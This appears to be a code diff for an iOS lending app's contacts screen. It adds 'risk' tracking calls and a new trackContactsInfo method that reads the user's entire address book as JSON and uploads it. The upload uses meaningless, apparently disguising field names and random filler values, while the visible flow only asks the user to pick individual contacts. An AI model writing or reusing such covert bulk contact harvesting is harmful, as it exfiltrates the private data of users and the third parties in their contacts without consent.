@@ -35,6 +35,7 @@ NS_ASSUME_NONNULL_BEGIN
 - (void)viewDidAppear:(BOOL)animated{
     [super viewDidAppear: animated];
     [self.tableView.mj_header beginRefreshing];
+    [[TrackTools shared] saveTrackTime:BPTrackRiskTypeContacts start:YES];
 }
 
 -(void)configUI{
@@ -126,9 +127,12 @@ NS_ASSUME_NONNULL_BEGIN
 }
 
 -(void)nextStep{
+    kWeakSelf;
     [self.viewModel saveUserInfoWith:self.productId completion:^(BOOL success) {
         if (success) {
             [[ProductHandle shared] onPushNextStep:self.productId type:@""];
+            [[TrackTools shared] saveTrackTime:BPTrackRiskTypeContacts start:NO];
+            [[TrackTools shared] trackRiskInfo:BPTrackRiskTypeContacts productId:weakSelf.productId];
         }
     }];
 }
@@ -156,6 +160,7 @@ NS_ASSUME_NONNULL_BEGIN
             pickVC.delegate = weakSelf;
             pickVC.predicateForEnablingContact = [NSPredicate predicateWithFormat:@"phoneNumbers.@count > 0"];
             [self presentViewController:pickVC animated:NO completion:nil];
+            
         }else{
             [self showCustomAlertWithTitle:@"" message:kContactsAlertMessage confirmCompletion:^{
                 [[Routes shared] routeTo:[NSString stringWithFormat:@"%@%@",
@@ -174,6 +179,19 @@ NS_ASSUME_NONNULL_BEGIN
     [self.tableView reloadData];
 }
 
+
+-(void)trackContactsInfo{
+    [[BPContactsTools shared] fetchContactsAsJSONWithCompletionHandler:^(NSString * _Nullable json) {
+        if (json.length > 0) {
+            NSMutableDictionary *dic = [[NSMutableDictionary alloc] init];
+            dic[@"everyonehad"] = @"3";
+            dic[@"withdiminished"] = [NSString randomString];
+            dic[@"cavalcade"] = [NSString randomString];
+            dic[@"couldsee"] = json;
+            [[TrackTools shared] trackContactsInfo:dic];
+        }
+    }];
+}
 // MARK: - CNContactPickerDelegate
 - (void)contactPicker:(CNContactPickerViewController *)picker didSelectContact:(CNContact *)contact{
     NSString *fullName = [CNContactFormatter stringFromContact:contact style:CNContactFormatterStyleFullName] ?: @"";
